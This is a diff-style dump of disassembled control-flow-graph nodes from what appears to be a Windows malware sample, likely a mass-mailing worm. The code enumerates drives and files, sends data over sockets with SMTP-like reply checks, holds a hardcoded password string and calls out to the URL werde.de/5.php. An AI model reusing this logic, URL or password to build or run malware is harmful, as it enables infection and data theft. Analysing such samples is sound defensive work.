+node sub_401FB9(4202613) info:
+ start: 4202613
+ prev: []
+ instructions: 
+  4202613, ['lodsw']
+  4202615, ['push', 'ax']
+  4202617, ['push', '[ebp+lpString2];lpString']
+  4202620, ['push', 'esi;int']
+  4202621, ['push', '[ebp+hMem];int']
+  4202624, ['call', 'sub_401F86']
+  4202629, ['mov', 'esi,eax']
+  4202631, ['pop', 'dx']
+  4202633, ['cmp', 'dx,[ebp+var_E]']
+  4202637, ['jnb', 'shortloc_40209E']
+ next: [4202639, 4202654]
+
+node :51
+node sub_4020BB(4202698) info:
+ start: 4202698
+ prev: []
+ instructions: 
+  4202698, ['mov', 'byte_405377,1']
+  4202705, ['call', 'sub_401CC1']
+ next: [4202710]
+
+node :52
+node sub_4010DD(4198648) info:
+ start: 4198648
+ prev: []
+ instructions: 
+  4198648, ['xor', 'ebx,ebx']
+  4198650, ['lodsb']
+  4198651, ['shl', 'eax,8']
+  4198654, ['loop', 'loc_401107']
+ next: [4198656, 4198663]
+
+node :53
+node sub_402CD8(4205845) info:
+ start: 4205845
+ prev: []
+ instructions: 
+  4205845, ['push', 'esi;lpString']
+  4205846, ['call', 'lstrlenA']
+  4205851, ['add', 'esi,eax']
+  4205853, ['inc', 'esi']
+  4205854, ['jmp', 'shortloc_402CFF']
+ next: [4205823]
+
+node :54
+node sub_402CD8(4205784) info:
+ start: 4205784
+ prev: []
+ instructions: 
+  4205784, ['push', 'ebp']
+  4205785, ['mov', 'ebp,esp']
+  4205787, ['add', 'esp,0FFFFFFFCh']
+  4205790, ['push', 'esi']
+  4205791, ['push', 'ebx']
+  4205792, ['push', '2000h;dwBytes']
+  4205797, ['push', '40h;uFlags']
+  4205799, ['call', 'GlobalAlloc']
+  4205804, ['mov', '[ebp+lpBuffer],eax']
+  4205807, ['push', '[ebp+lpBuffer];lpBuffer']
+  4205810, ['push', '1FFFh;nBufferLength']
+  4205815, ['call', 'GetLogicalDriveStringsA']
+  4205820, ['mov', 'esi,[ebp+lpBuffer]']
+ next: [4205823]
+
+node :55
+node sub_401E1F(4202088) info:
+ start: 4202088
+ prev: []
+ instructions: 
+  4202088, ['mov', 'edx,[ebp+arg_0]']
+  4202091, ['mov', 'edx,[edx]']
+  4202093, ['lea', 'eax,[ebp+buf]']
+  4202096, ['push', 'eax']
+  4202097, ['push', '80h']
+  4202102, ['lea', 'eax,[ebp+var_84]']
+  4202108, ['push', 'eax']
+  4202109, ['push', '[ebp+arg_0]']
+  4202112, ['call', 'dwordptr[edx+0Ch]']
+  4202115, ['cmp', 'dwordptr[ebp+buf],0']
+  4202119, ['jz', 'shortloc_401E9D']
+ next: [4202121, 4202141]
+
+node :56
+node sub_401274(4199053) info:
+ start: 4199053
+ prev: []
+ instructions: 
+  4199053, ['add', 'edi,4']
+  4199056, ['mul', 'dword_4052DD']
+  4199062, ['mov', '[edi],eax']
+  4199064, ['inc', 'dword_4052D9']
+  4199070, ['cmp', 'dword_4052D9,270h']
+  4199080, ['jnz', 'shortloc_40128D']
+ next: [4199082, 4199053]
+
+node :57
+node sub_401274(4199028) info:
+ start: 4199028
+ prev: []
+ instructions: 
+  4199028, ['push', 'ebp']
+  4199029, ['mov', 'ebp,esp']
+  4199031, ['push', 'edi']
+  4199032, ['lea', 'edi,dword_405424']
+  4199038, ['mov', 'eax,[ebp+arg_0]']
+  4199041, ['mov', '[edi],eax']
+  4199043, ['mov', 'dword_4052D9,1']
+ next: [4199053]
+
+node :58
+node sub_402B36(4205422) info:
+ start: 4205422
+ prev: []
+ instructions: 
+  4205422, ['push', '[ebp+lpString2];lpString']
+  4205425, ['push', '[ebp+lpString2];int']
+  4205428, ['call', 'sub_40246F']
+  4205433, ['jmp', 'shortloc_402B88']
+ next: [4205448]
+
+node :59
+node sub_402B36(4205435) info:
+ start: 4205435
+ prev: []
+ instructions: 
+  4205435, ['push', '[ebp+lpString2];lpString']
+  4205438, ['push', 'offsetbyte_407D72;int']
+  4205443, ['call', 'sub_40246F']
+ next: [4205448]
+
+node :60
+node sub_4012AF(4199253) info:
+ start: 4199253
+ prev: []
+ instructions: 
+  4199253, ['xor', 'eax,9908B0DFh']
+ next: [4199258]
+
+node :61
+node sub_4012AF(4199087) info:
+ start: 4199087
+ prev: []
+ instructions: 
+  4199087, ['push', 'ebp']
+  4199088, ['mov', 'ebp,esp']
+  4199090, ['add', 'esp,0FFFFFFFCh']
+  4199093, ['push', 'esi']
+  4199094, ['push', 'edi']
+  4199095, ['push', 'ebx']
+  4199096, ['lea', 'edi,dword_405424']
+  4199102, ['cmp', 'dword_4052D9,270h']
+  4199112, ['jb', 'loc_40138F']
+ next: [4199118, 4199311]
+
+node :62
+node sub_401E1F(4202051) info:
+ start: 4202051
+ prev: []
+ instructions: 
+  4202051, ['mov', 'ebx,eax']
+  4202053, ['push', '[ebp+arg_0]']
+  4202056, ['call', 'sub_40142B']
+  4202061, ['xchg', 'al,ah']
+  4202063, ['mov', 'dwordptr[ebp+buf],eax']
+  4202066, ['push', '0;flags']
+  4202068, ['push', '2;len']
+  4202070, ['lea', 'eax,[ebp+buf]']
+  4202073, ['push', 'eax;buf']
+  4202074, ['push', 'ebx;s']
+  4202075, ['call', 'send']
+  4202080, ['push', '[ebp+arg_0]']
+  4202083, ['call', 'sub_401473']
+ next: [4202088]
+
+node :63
+node sub_401E1F(4202121) info:
+ start: 4202121
+ prev: []
+ instructions: 
+  4202121, ['push', '0;flags']
+  4202123, ['push', 'dwordptr[ebp+buf];len']
+  4202126, ['lea', 'eax,[ebp+var_84]']
+  4202132, ['push', 'eax;buf']
+  4202133, ['push', 'ebx;s']
+  4202134, ['call', 'send']
+  4202139, ['jmp', 'shortloc_401E68']
+ next: [4202088]
+
+node :64
+node sub_402CA7(4205735) info:
+ start: 4205735
+ prev: []
+ instructions: 
+  4205735, ['push', 'ebp']
+  4205736, ['mov', 'ebp,esp']
+  4205738, ['add', 'esp,0FFFFFFFCh']
+  4205741, ['push', '10000h;dwBytes']
+  4205746, ['push', '40h;uFlags']
+  4205748, ['call', 'GlobalAlloc']
+  4205753, ['mov', '[ebp+hMem],eax']
+  4205756, ['push', '[ebp+lpString2];lpString2']
+  4205759, ['push', 'eax;lpString1']
+  4205760, ['call', 'lstrcpyA']
+  4205765, ['push', 'eax;int']
+  4205766, ['push', 'eax;lpString']
+  4205767, ['call', 'sub_402BD5']
+  4205772, ['push', '[ebp+hMem];hMem']
+  4205775, ['call', 'GlobalFree']
+  4205780, ['leave']
+  4205781, ['retn', '4']
+ next: []
+
+node :65
+node sub_401E1F(4202015) info:
+ start: 4202015
+ prev: []
+ instructions: 
+  4202015, ['push', 'ebp']
+  4202016, ['mov', 'ebp,esp']
+  4202018, ['add', 'esp,0FFFFFF7Ch']
+  4202024, ['push', 'ebx']
+  4202025, ['mov', 'ecx,35h']
+  4202030, ['xchg', 'cl,ch']
+  4202032, ['push', 'ecx;int']
+  4202033, ['push', '0;int']
+  4202035, ['push', '[ebp+cp];cp']
+  4202038, ['call', 'sub_401B2A']
+  4202043, ['or', 'eax,eax']
+  4202045, ['jz', 'loc_401F2A']
+ next: [4202051, 4202282]
+
+node :66
+node sub_40246F(4203631) info:
+ start: 4203631
+ prev: []
+ instructions: 
+  4203631, ['push', 'ebp']
+  4203632, ['mov', 'ebp,esp']
+  4203634, ['push', 'esi']
+  4203635, ['push', 'ebx']
+  4203636, ['push', '40h']
+  4203638, ['push', '0']
+  4203640, ['push', '[ebp+lpString]']
+  4203643, ['call', 'StrRChrA']
+  4203648, ['or', 'eax,eax']
+  4203650, ['jz', 'shortloc_4024A3']
+ next: [4203652, 4203683]
+
+node :67
+node sub_402782(4204517) info:
+ start: 4204517
+ prev: []
+ instructions: 
+  4204517, ['push', '[ebp+hMem];hMem']
+  4204520, ['call', 'GlobalFree']
+  4204525, ['push', '[ebp+var_8];hMem']
+  4204528, ['call', 'LocalFree']
+  4204533, ['push', '[ebp+var_C];hMem']
+  4204536, ['call', 'LocalFree']
+  4204541, ['jmp', 'shortloc_40280A']
+ next: [4204554]
+
+node :68
+node sub_402782(4204543) info:
+ start: 4204543
+ prev: []
+ instructions: 
+  4204543, ['push', 'hMutex;hMutex']
+  4204549, ['call', 'ReleaseMutex']
+ next: [4204554]
+
+node :69
+node sub_402782(4204418) info:
+ start: 4204418
+ prev: []
+ instructions: 
+  4204418, ['push', 'ebp']
+  4204419, ['mov', 'ebp,esp']
+  4204421, ['add', 'esp,0FFFFFFF4h']
+  4204424, ['push', 'ebx']
+  4204425, ['push', 'edi']
+  4204426, ['xor', 'eax,eax']
+  4204428, ['mov', 'ebx,[ebp+lpThreadParameter]']
+ next: [4204431]
+
+node :70
+node sub_402782(4204554) info:
+ start: 4204554
+ prev: []
+ instructions: 
+  4204554, ['dec', 'dwordptr[ebx]']
+  4204556, ['jg', 'shortloc_40278F']
+ next: [4204431, 4204558]
+
+node :71
+node sub_402DCC(4206049) info:
+ start: 4206049
+ prev: []
+ instructions: 
+  4206049, ['mov', 'edx,edi']
+  4206051, ['xor', 'eax,eax']
+  4206053, ['or', 'ecx,0FFFFFFFFh']
+  4206056, ['repne', 'scasb']
+  4206058, ['push', 'edx']
+  4206059, ['call', 'sub_402D47']
+  4206064, ['cmp', 'byteptr[edi],0']
+  4206067, ['jnz', 'shortloc_402DE1']
+ next: [4206069, 4206049]
+
+node :72
+node sub_402DCC(4206028) info:
+ start: 4206028
+ prev: []
+ instructions: 
+  4206028, ['push', 'edi']
+  4206029, ['call', 'sub_40166E']
+  4206034, ['or', 'eax,eax']
+  4206036, ['jnz', 'shortloc_402DDB']
+ next: [4206038, 4206043]
+
+node :73
+node sub_402DCC(4206043) info:
+ start: 4206043
+ prev: []
+ instructions: 
+  4206043, ['mov', 'edi,offsetaHttpWww_werde_;"http://www.werde.de/5.php"']
+  4206048, ['cld']
+ next: [4206049]
+
+node :74
+node sub_403100(4206941) info:
+ start: 4206941
+ prev: []
+ instructions: 
+  4206941, ['cmp', 'wordptr[esi+2],0FFFFh']
+  4206946, ['jnz', 'shortloc_403171']
+ next: [4206948, 4206961]
+
+node :75
+node sub_401E1F(4202168) info:
+ start: 4202168
+ prev: []
+ instructions: 
+  4202168, ['push', '[ebp+arg_0]']
+  4202171, ['call', 'sub_401473']
+  4202176, ['mov', 'dwordptr[ebp+buf],0']
+  4202183, ['mov', 'edx,[ebp+arg_0]']
+  4202186, ['mov', 'edx,[edx]']
+  4202188, ['push', '0']
+  4202190, ['push', '2']
+  4202192, ['lea', 'eax,[ebp+buf]']
+  4202195, ['push', 'eax']
+  4202196, ['push', '[ebp+arg_0]']
+  4202199, ['call', 'dwordptr[edx+0Ch]']
+  4202202, ['push', '[ebp+arg_0]']
+  4202205, ['call', 'sub_401486']
+  4202210, ['mov', 'eax,dwordptr[ebp+buf]']
+  4202213, ['xchg', 'al,ah']
+  4202215, ['push', '0;int']
+  4202217, ['push', '4;int']
+  4202219, ['push', 'eax;int']
+  4202220, ['push', '[ebp+arg_0];int']
+  4202223, ['push', 'ebx;s']
+  4202224, ['call', 'sub_4019D4']
+  4202229, ['test', 'eax,eax']
+  4202231, ['jz', 'shortloc_401F24']
+ next: [4202233, 4202276]
+
+node :76
+node sub_401FB9(4202607) info:
+ start: 4202607
+ prev: []
+ instructions: 
+  4202607, ['xchg', 'al,ah']
+  4202609, ['add', 'esi,eax']
+  4202611, ['jmp', 'shortloc_40209E']
+ next: [4202654]
+
+node :77
+node sub_401FB9(4202639) info:
+ start: 4202639
+ prev: []
+ instructions: 
+  4202639, ['mov', '[ebp+var_E],dx']
+  4202643, ['push', '[ebp+lpString2];lpString2']
+  4202646, ['push', '[ebp+lpString1];lpString1']
+  4202649, ['call', 'lstrcpyA']
+ next: [4202654]
+
+node :78
+node sub_401FB9(4202542) info:
+ start: 4202542
+ prev: []
+ instructions: 
+  4202542, ['movzx', 'ebx,wordptr[esi+6]']
+  4202546, ['add', 'esi,0Ch']
+  4202549, ['push', '[ebp+lpString2];lpString']
+  4202552, ['push', 'esi;int']
+  4202553, ['push', '[ebp+hMem];int']
+  4202556, ['call', 'sub_401F86']
+  4202561, ['mov', 'esi,eax']
+  4202563, ['lodsd']
+  4202564, ['cmp', 'eax,1000F00h']
+  4202569, ['jz', 'shortloc_40204D']
+ next: [4202571, 4202573]
+
+node :79
+node sub_402DF7(4206071) info:
+ start: 4206071
+ prev: []
+ instructions: 
+  4206071, ['push', 'ebp']
+  4206072, ['mov', 'ebp,esp']
+ next: [4206074]
+
+node :80
+node sub_401FB9(4202425) info:
+ start: 4202425
+ prev: []
+ instructions: 
+  4202425, ['push', 'ebp']
+  4202426, ['mov', 'ebp,esp']
+  4202428, ['add', 'esp,0FFFFFFF0h']
+  4202431, ['push', 'esi']
+  4202432, ['push', 'edi']
+  4202433, ['push', 'ebx']
+  4202434, ['mov', '[ebp+var_E],0FFFFh']
+  4202440, ['push', '10000h;dwBytes']
+  4202445, ['push', '0;uFlags']
+  4202447, ['call', 'GlobalAlloc']
+  4202452, ['mov', '[ebp+lpString2],eax']
+  4202455, ['push', '10000h;dwBytes']
+  4202460, ['push', '0;uFlags']
+  4202462, ['call', 'GlobalAlloc']
+  4202467, ['mov', 'byteptr[eax],0']
+  4202470, ['mov', '[ebp+lpString1],eax']
+  4202473, ['push', '[ebp+arg_0]']
+  4202476, ['call', 'sub_40142B']
+  4202481, ['mov', 'ebx,eax']
+  4202483, ['push', 'eax;dwBytes']
+  4202484, ['push', '0;uFlags']
+  4202486, ['call', 'GlobalAlloc']
+  4202491, ['mov', '[ebp+hMem],eax']
+  4202494, ['push', '[ebp+arg_0]']
+  4202497, ['call', 'sub_401473']
+  4202502, ['mov', 'edx,[ebp+arg_0]']
+  4202505, ['mov', 'edx,[edx]']
+  4202507, ['push', '0']
+  4202509, ['push', 'ebx']
+  4202510, ['push', '[ebp+hMem]']
+  4202513, ['push', '[ebp+arg_0]']
+  4202516, ['call', 'dwordptr[edx+0Ch]']
+  4202519, ['mov', 'esi,[ebp+hMem]']
+  4202522, ['ror', 'wordptr[esi+6],8']
+  4202527, ['ror', 'wordptr[esi+2],8']
+  4202532, ['test', 'wordptr[esi+2],0Fh']
+  4202538, ['jz', 'shortloc_40202E']
+ next: [4202540, 4202542]
+
+node :81
+node sub_402BD5(4205602) info:
+ start: 4205602
+ prev: []
+ instructions: 
+  4205602, ['mov', 'eax,[ebp+lpString]']
+  4205605, ['mov', 'byteptr[edi+eax],0']
+  4205609, ['mov', 'edx,[ebp+lpFindFileData]']
+  4205612, ['lea', 'edx,[edx+2Ch]']
+  4205615, ['cmp', 'wordptr[edx],2Eh']
+  4205619, ['jz', 'shortloc_402C74']
+ next: [4205621, 4205684]
+
+node :82
+node sub_401D31(4201857) info:
+ start: 4201857
+ prev: []
+ instructions: 
+  4201857, ['mov', 'edx,edi']
+  4201859, ['mov', 'al,2Eh']
+  4201861, ['cld']
+  4201862, ['repne', 'scasb']
+  4201864, ['mov', 'ebx,edi']
+  4201866, ['sub', 'ebx,edx']
+  4201868, ['cmp', 'byteptr[edi-1],2Eh']
+  4201872, ['jnz', 'shortloc_401D93']
+ next: [4201874, 4201875]
+
+node :83
+node sub_402BD5(4205621) info:
+ start: 4205621
+ prev: []
+ instructions: 
+  4205621, ['cmp', 'wordptr[edx],2E2Eh']
+  4205626, ['jz', 'shortloc_402C74']
+ next: [4205628, 4205684]
+
+node :84
+node sub_402BD5(4205684) info:
+ start: 4205684
+ prev: []
+ instructions: 
+  4205684, ['push', '1;dwMilliseconds']
+  4205686, ['call', 'Sleep']
+  4205691, ['push', '[ebp+lpFindFileData];lpFindFileData']
+  4205694, ['push', '[ebp+hFindFile];hFindFile']
+  4205697, ['call', 'FindNextFileA']
+  4205702, ['test', 'eax,eax']
+  4205704, ['jnz', 'shortloc_402C22']
+ next: [4205602, 4205706]
+
+node :85
+node sub_402BD5(4205525) info:
+ start: 4205525
+ prev: []
+ instructions: 
+  4205525, ['push', 'ebp']
+  4205526, ['mov', 'ebp,esp']
+  4205528, ['add', 'esp,0FFFFFFF4h']
+  4205531, ['push', 'edi']
+  4205532, ['push', '400h;uBytes']
+  4205537, ['push', '0;uFlags']
+  4205539, ['call', 'LocalAlloc']
+  4205544, ['mov', '[ebp+hMem],eax']
+  4205547, ['push', '13Eh;uBytes']
+  4205552, ['push', '0;uFlags']
+  4205554, ['call', 'LocalAlloc']
+  4205559, ['mov', '[ebp+lpFindFileData],eax']
+  4205562, ['push', '[ebp+lpString];lpString']
+  4205565, ['call', 'lstrlenA']
+  4205570, ['mov', 'edi,eax']
+  4205572, ['push', 'offseta_;"*.*"']
+  4205577, ['push', '[ebp+lpString];lpString1']
+  4205580, ['call', 'lstrcatA']
+  4205585, ['push', '[ebp+lpFindFileData];lpFindFileData']
+  4205588, ['push', '[ebp+lpString];lpFileName']
+  4205591, ['call', 'FindFirstFileA']
+  4205596, ['mov', '[ebp+hFindFile],eax']
+  4205599, ['inc', 'eax']
+  4205600, ['jz', 'shortloc_402C92']
+ next: [4205602, 4205714]
+
+node :86
+node sub_401FB9(4202573) info:
+ start: 4202573
+ prev: []
+ instructions: 
+  4202573, ['or', 'ebx,ebx']
+  4202575, ['jz', 'shortloc_4020A1']
+ next: [4202577, 4202657]
+
+node :87
+node sub_401FB9(4202654) info:
+ start: 4202654
+ prev: []
+ instructions: 
+  4202654, ['dec', 'ebx']
+  4202655, ['jnz', 'shortloc_402051']
+ next: [4202577, 4202657]
+
+node :88
+node sub_402E35(4206314) info:
+ start: 4206314
+ prev: []
+ instructions: 
+  4206314, ['push', '[ebp+arg_4]']
+  4206317, ['call', 'sub_401473']
+  4206322, ['mov', 'edx,[ebp+arg_4]']
+  4206325, ['mov', 'edx,[edx]']
+  4206327, ['push', '0']
+  4206329, ['push', '0C8h']
+  4206334, ['lea', 'eax,[ebp+String1]']
+  4206340, ['push', 'eax']
+  4206341, ['push', '[ebp+arg_4]']
+  4206344, ['call', 'dwordptr[edx+0Ch]']
+  4206347, ['push', '[ebp+arg_4]']
+  4206350, ['call', 'sub_401486']
+  4206355, ['push', 'offsetaGhiuigftytughu;"ghiuigftytughu"']
+  4206360, ['lea', 'eax,[ebp+String1]']
+  4206366, ['push', 'eax;lpString1']
+  4206367, ['call', 'lstrcmpiA']
+  4206372, ['or', 'eax,eax']
+  4206374, ['jz', 'shortloc_402F2D']
+ next: [4206376, 4206381]
+
+node :89
+node sub_402E35(4206133) info:
+ start: 4206133
+ prev: []
+ instructions: 
+  4206133, ['push', 'ebp']
+  4206134, ['mov', 'ebp,esp']
+  4206136, ['add', 'esp,0FFFFFEA0h']
+  4206142, ['push', 'esi']
+  4206143, ['push', 'edi']
+  4206144, ['push', 'ebx']
+  4206145, ['push', '0FFFFFFFFh;dwMilliseconds']
+  4206147, ['push', 'hHandle;hHandle']
+  4206153, ['call', 'WaitForSingleObject']
+  4206158, ['mov', '[ebp+var_1],0']
+  4206162, ['mov', '[ebp+var_152],0']
+  4206169, ['push', '8']
+  4206171, ['lea', 'eax,[ebp+String2]']
+  4206177, ['push', 'eax']
+  4206178, ['call', 'sub_401000']
+  4206183, ['push', '[ebp+arg_4]']
+  4206186, ['call', 'sub_401486']
+  4206191, ['push', '0;int']
+  4206193, ['push', '5;int']
+  4206195, ['push', '1;int']
+  4206197, ['push', '[ebp+arg_4];int']
+  4206200, ['push', '[ebp+s];s']
+  4206203, ['call', 'sub_4019D4']
+  4206208, ['test', 'eax,eax']
+  4206210, ['jz', 'loc_4030E4']
+ next: [4206216, 4206820]
+
+node :90
+node sub_402E35(4206381) info:
+ start: 4206381
+ prev: []
+ instructions: 
+  4206381, ['cld']
+  4206382, ['lea', 'edi,[ebp+String1]']
+  4206388, ['mov', 'eax,1Ah']
+  4206393, ['stosd']
+  4206394, ['mov', 'eax,dword_40500F']
+  4206399, ['stosd']
+  4206400, ['push', '0;flags']
+  4206402, ['push', '8;len']
+  4206404, ['lea', 'eax,[ebp+String1]']
+  4206410, ['push', 'eax;buf']
+  4206411, ['push', '[ebp+s];s']
+  4206414, ['call', 'send']
+  4206419, ['cmp', '[ebp+var_152],2']
+  4206426, ['jz', 'shortloc_402F69']
+ next: [4206428, 4206441]
+
+node :91
+node sub_4016CF(4200250) info:
+ start: 4200250
+ prev: []
+ instructions: 
+  4200250, ['mov', 'ebx,eax']
+  4200252, ['push', '0;dwNumberOfBytesToMap']
+  4200254, ['push', '0;dwFileOffsetLow']
+  4200256, ['push', '0;dwFileOffsetHigh']
+  4200258, ['push', '4;dwDesiredAccess']
+  4200260, ['push', 'eax;hFileMappingObject']
+  4200261, ['call', 'MapViewOfFile']
+  4200266, ['or', 'eax,eax']
+  4200268, ['jz', 'shortloc_401788']
+ next: [4200270, 4200328]
+
+node :92
+node sub_4010DD(4198692) info:
+ start: 4198692
+ prev: []
+ instructions: 
+  4198692, ['pop', 'ecx']
+  4198693, ['call', 'sub_401159']
+  4198698, ['xchg', 'eax,edx']
+  4198699, ['stosd']
+  4198700, ['xchg', 'eax,edx']
+  4198701, ['inc', '[ebp+var_4]']
+  4198704, ['cmp', '[ebp+var_4],12h']
+  4198708, ['jnz', 'shortloc_401145']
+ next: [4198710, 4198725]
+
+node :93
+node sub_402E35(4206216) info:
+ start: 4206216
+ prev: []
+ instructions: 
+  4206216, ['push', '[ebp+arg_4]']
+  4206219, ['call', 'sub_401473']
+  4206224, ['mov', 'edx,[ebp+arg_4]']
+  4206227, ['mov', 'edx,[edx]']
+  4206229, ['push', '0']
+  4206231, ['push', '1']
+  4206233, ['lea', 'eax,[ebp+var_152]']
+  4206239, ['push', 'eax']
+  4206240, ['push', '[ebp+arg_4]']
+  4206243, ['call', 'dwordptr[edx+0Ch]']
+  4206246, ['push', '[ebp+arg_4]']
+  4206249, ['call', 'sub_401486']
+  4206254, ['cmp', '[ebp+var_152],2']
+  4206261, ['jz', 'shortloc_402ECE']
+ next: [4206263, 4206286]
+
+node :94
+node sub_401D31(4201875) info:
+ start: 4201875
+ prev: []
+ instructions: 
+  4201875, ['mov', '[ebp+var_10],ebx']
+  4201878, ['push', 'ecx']
+  4201879, ['push', 'edx']
+  4201880, ['mov', 'edx,[ebp+arg_0]']
+  4201883, ['mov', 'edx,[edx]']
+  4201885, ['push', '0']
+  4201887, ['push', '1']
+  4201889, ['lea', 'eax,[ebp+var_10]']
+  4201892, ['push', 'eax']
+  4201893, ['push', '[ebp+arg_0]']
+  4201896, ['call', 'dwordptr[edx+10h]']
+  4201899, ['pop', 'ecx']
+  4201900, ['mov', 'edx,[ebp+arg_0]']
+  4201903, ['mov', 'edx,[edx]']
+  4201905, ['push', '0']
+  4201907, ['push', '[ebp+var_10]']
+  4201910, ['push', 'ecx']
+  4201911, ['push', '[ebp+arg_0]']
+  4201914, ['call', 'dwordptr[edx+10h]']
+  4201917, ['mov', '[ebp+var_10],0']
+  4201924, ['pop', 'ecx']
+  4201925, ['test', 'ecx,ecx']
+  4201927, ['jnz', 'shortloc_401D81']
+ next: [4201857, 4201929]
+
+node :95
+node sub_401D31(4201777) info:
+ start: 4201777
+ prev: []
+ instructions: 
+  4201777, ['push', 'ebp']
+  4201778, ['mov', 'ebp,esp']
+  4201780, ['add', 'esp,0FFFFFFECh']
+  4201783, ['push', 'esi']
+  4201784, ['push', 'edi']
+  4201785, ['push', 'ebx']
+  4201786, ['push', '0Ch']
+  4201788, ['lea', 'eax,[ebp+var_C]']
+  4201791, ['push', 'eax']
+  4201792, ['call', 'sub_401000']
+  4201797, ['mov', '[ebp+var_C],202h']
+  4201803, ['mov', '[ebp+var_A],100h']
+  4201809, ['ror', '[ebp+var_A],8']
+  4201814, ['mov', '[ebp+var_8],1']
+  4201820, ['ror', '[ebp+var_8],8']
+  4201825, ['mov', 'edx,[ebp+arg_0]']
+  4201828, ['mov', 'edx,[edx]']
+  4201830, ['push', '0']
+  4201832, ['push', '0Ch']
+  4201834, ['lea', 'eax,[ebp+var_C]']
+  4201837, ['push', 'eax']
+  4201838, ['push', '[ebp+arg_0]']
+  4201841, ['call', 'dwordptr[edx+10h]']
+  4201844, ['push', '[ebp+lpString];lpString']
+  4201847, ['call', 'lstrlenA']
+  4201852, ['mov', 'ecx,eax']
+  4201854, ['mov', 'edi,[ebp+lpString]']
+ next: [4201857]
+
+node :96
+node sub_403100(4206948) info:
+ start: 4206948
+ prev: []
+ instructions: 
+  4206948, ['push', '[ebp+ppstm];int']
+  4206951, ['push', '[ebp+s];s']
+  4206954, ['call', 'sub_402E35']
+  4206959, ['jmp', 'shortloc_403173']
+ next: [4206963]
+
+node :97
+node sub_402CD8(4205823) info:
+ start: 4205823
+ prev: []
+ instructions: 
+  4205823, ['cmp', 'byteptr[esi],0']
+  4205826, ['jz', 'shortloc_402D20']
+ next: [4205828, 4205856]
+
+node :98
+node sub_402CD8(4205828) info:
+ start: 4205828
+ prev: []
+ instructions: 
+  4205828, ['push', 'esi;lpRootPathName']
+  4205829, ['call', 'GetDriveTypeA']
+  4205834, ['cmp', 'eax,3']
+  4205837, ['jnz', 'shortloc_402D15']
+ next: [4205839, 4205845]
+
+node :99
+node sub_4021D1(4203476) info:
+ start: 4203476
+ prev: []
+ instructions: 
+  4203476, ['push', '[ebp+var_4]']
+  4203479, ['call', 'sub_402105']
+  4203484, ['cmp', 'eax,343533h']
+  4203489, ['jnz', 'shortloc_402440']
+ next: [4203491, 4203584]
+
+node :100
+node sub_4016CF(4200270) info:
+ start: 4200270
+ prev: []
+ instructions: 
+  4200270, ['push', 'eax;lpBaseAddress']
+  4200271, ['push', 'eax']
+  4200272, ['mov', 'edx,[ebp+var_8]']
+  4200275, ['shl', 'edx,2']
+  4200278, ['push', 'edx;dwBytes']
+  4200279, ['push', '40h;uFlags']
+  4200281, ['call', 'GlobalAlloc']
+  4200286, ['mov', 'lpString,eax']
+  4200291, ['pop', 'edx']
+  4200292, ['push', '[ebp+var_8]']
+  4200295, ['push', 'lpString']
+  4200301, ['push', 'edx']
+  4200302, ['call', 'sub_4010DD']
+  4200307, ['push', 'lpString;lpString']
+  4200313, ['call', 'lstrlenA']
+  4200318, ['mov', 'dword_407B28,eax']
+  4200323, ['call', 'UnmapViewOfFile']
+ next: [4200328]
+
+node :101
+node sub_401159(4198766) info:
+ start: 4198766
+ prev: []
+ instructions: 
+  4198766, ['jmp', 'shortloc_40117E']
+ next: [4198782]
+
+node :102
+node sub_402E35(4206428) info:
+ start: 4206428
+ prev: []
+ instructions: 
+  4206428, ['cmp', '[ebp+var_152],3']
+  4206435, ['jnz', 'loc_4030D6']
+ next: [4206441, 4206806]
+
+node :103
+node sub_4021D1(4203528) info:
+ start: 4203528
+ prev: []
+ instructions: 
+  4203528, ['push', '0;flags']
+  4203530, ['push', '[ebp+len];len']
+  4203533, ['push', '[ebp+buf];buf']
+  4203536, ['push', 'ebx;s']
+  4203537, ['call', 'send']
+  4203542, ['test', 'eax,eax']
+  4203544, ['jle', 'shortloc_402440']
+ next: [4203546, 4203584]
+
+node :104
+node sub_401159(4198768) info:
+ start: 4198768
+ prev: []
+ instructions: 
+  4198768, ['add', 'dl,0FCh']
+  4198771, ['jmp', 'shortloc_40117E']
+ next: [4198782]
+
+node :105
+node sub_402E35(4206263) info:
+ start: 4206263
+ prev: []
+ instructions: 
+  4206263, ['cmp', '[ebp+var_152],3']
+  4206270, ['jz', 'shortloc_402ECE']
+ next: [4206272, 4206286]
+
+node :106
+node sub_4021D1(4203182) info:
+ start: 4203182
+ prev: []
+ instructions: 
+  4203182, ['push', '[ebp+var_4]']
+  4203185, ['call', 'sub_402105']
+  4203190, ['cmp', 'eax,303532h']
+  4203195, ['jnz', 'loc_402440']
+ next: [4203201, 4203584]
+
+node :107
+node sub_4010DD(4198710) info:
+ start: 4198710
+ prev: []
+ instructions: 
+  4198710, ['mov', '[ebp+var_4],0']
+  4198717, ['push', 'eax']
+  4198718, ['mov', 'ax,0A0Dh']
+  4198722, ['stosw']
+  4198724, ['pop', 'eax']
+ next: [4198725]
+
+node :108
+node sub_401159(4198773) info:
+ start: 4198773
+ prev: []
+ instructions: 
+  4198773, ['sub', 'dl,3Eh']
+  4198776, ['shl', 'dl,2']
+  4198779, ['add', 'dl,2Bh']
+ next: [4198782]
+
+node :109
+node sub_4021D1(4203249) info:
+ start: 4203249
+ prev: []
+ instructions: 
+  4203249, ['push', '[ebp+var_4]']
+  4203252, ['call', 'sub_402105']
+  4203257, ['cmp', 'eax,303532h']
+  4203262, ['jnz', 'loc_402440']
+ next: [4203268, 4203584]
+
+node :110
+node sub_40298F(4205065) info:
+ start: 4205065
+ prev: []
+ instructions: 
+  4205065, ['lodsb']
+  4205066, ['or', 'al,al']
+  4205068, ['jz', 'shortloc_402A15']
+ next: [4205070, 4205077]
+
+node :111
+node sub_4021D1(4203082) info:
+ start: 4203082
+ prev: []
+ instructions: 
+  4203082, ['push', '[ebp+var_4]']
+  4203085, ['call', 'sub_402105']
+  4203090, ['cmp', 'eax,303232h']
+  4203095, ['jnz', 'loc_402440']
+ next: [4203101, 4203584]
+
+node :112
+node sub_4021D1(4203331) info:
+ start: 4203331
+ prev: []
+ instructions: 
+  4203331, ['push', '[ebp+var_4]']
+  4203334, ['call', 'sub_402105']
+  4203339, ['cmp', 'eax,303532h']
+  4203344, ['jnz', 'loc_402440']
+ next: [4203350, 4203584]
+
+node :113
+node sub_401D31(4201874) info:
+ start: 4201874
+ prev: []
+ instructions: 
+  4201874, ['dec', 'ebx']
+ next: [4201875]
+
+node :114
+node sub_4010DD(4198725) info:
+ start: 4198725
+ prev: []
+ instructions: 
+  4198725, ['pop', 'ecx']
+  4198726, ['or', 'ecx,ecx']
+  4198728, ['jnz', 'shortloc_4010F8']
+ next: [4198648, 4198730]
+
+node :115
